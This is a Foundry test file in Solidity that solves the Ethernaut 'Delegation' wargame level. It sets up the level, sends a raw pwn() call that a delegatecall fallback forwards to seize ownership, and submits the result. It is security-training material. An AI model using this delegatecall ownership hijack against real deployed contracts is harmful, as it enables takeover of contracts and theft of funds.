pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/06-Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 1 ether);
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory factory = new DelegationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Delegation level = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        
        (bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
        console.log(success);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}